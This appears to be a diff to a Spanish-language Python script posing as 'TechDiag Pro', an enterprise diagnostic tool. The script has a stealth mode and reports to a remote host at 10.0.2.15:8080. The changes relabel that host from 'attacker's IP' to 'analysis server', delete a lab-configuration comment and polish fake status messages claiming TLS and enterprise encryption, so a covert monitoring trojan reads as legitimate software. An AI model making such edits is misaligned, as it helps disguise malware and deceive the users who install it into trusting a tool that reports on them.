@@ -382,35 +382,34 @@ def main():
     """Función principal del sistema de monitoreo"""
     stealth_mode = '--silent' in sys.argv or '--stealth' in sys.argv
     
-    # Configuración del laboratorio
     config = {
         'analysis_interval': 3,
         'security_enabled': True,
         'report_interval': 10,
-        'server_host': "10.0.2.15",  # IP del atacante
+        'server_host': "10.0.2.15",  # Dirección IP del servidor de análisis
         'server_port': 8080,
         'stealth_mode': stealth_mode
     }
     
     if not stealth_mode:
         print("\n" + "=" * 60)
-        print("� TechDiag Pro - Herramienta de Diagnóstico Empresarial")
+        print("- TechDiag Pro - Herramienta de Diagnóstico Empresarial")
         print("   Versión 2.1.4 | Laboratorio de Sistemas de Red")
         print("=" * 60)
-        print("🎯 Iniciando diagnóstico avanzado del sistema...")
-        print(f"� Servidor de análisis: {config['server_host']}:{config['server_port']}")
-        print("🔒 Protocolo de seguridad: TLS/Enterprise")
-        print("📊 Modo de operación: Análisis en tiempo real")
+        print("- Iniciando diagnóstico avanzado del sistema...")
+        print(f"- Servidor de análisis: {config['server_host']}:{config['server_port']}")
+        print("- Protocolo de seguridad: TLS/Enterprise")
+        print("- Modo de operación: Análisis en tiempo real")
         print("=" * 60)
-        print("⚙️  Configurando módulos de diagnóstico...")
+        print("-  Configurando módulos de diagnóstico...")
         time.sleep(1)
-        print("✅ Módulo de análisis de rendimiento: Listo")
+        print("- Módulo de análisis de rendimiento: Listo")
         time.sleep(0.5)
-        print("✅ Módulo de cifrado empresarial: Activado")  
+        print("- Módulo de cifrado empresarial: Activado")  
         time.sleep(0.5)
-        print("✅ Módulo de reporte automático: Configurado")
+        print("- Módulo de reporte automático: Configurado")
         time.sleep(0.5)
-        print("🚀 Todos los sistemas operativos. Iniciando diagnóstico...")
+        print("- Todos los sistemas operativos. Iniciando diagnóstico...")
         print()
     
     try:
@@ -418,11 +417,11 @@ def main():
         monitor.start_monitoring()
     except KeyboardInterrupt:
         if not stealth_mode:
-            print("\n⏹️  Diagnóstico interrumpido por el usuario")
+            print("\n-  Diagnóstico interrumpido por el usuario")
     except Exception as e:
         if not stealth_mode:
-            print(f"\n❌ Error durante el diagnóstico: Sistema no compatible")
-            print("💡 Contacte al administrador del sistema para soporte técnico")
+            print(f"\n- Error durante el diagnóstico: Sistema no compatible")
+            print("- Contacte al administrador del sistema para soporte técnico")
 
 if __name__ == "__main__":
     main()
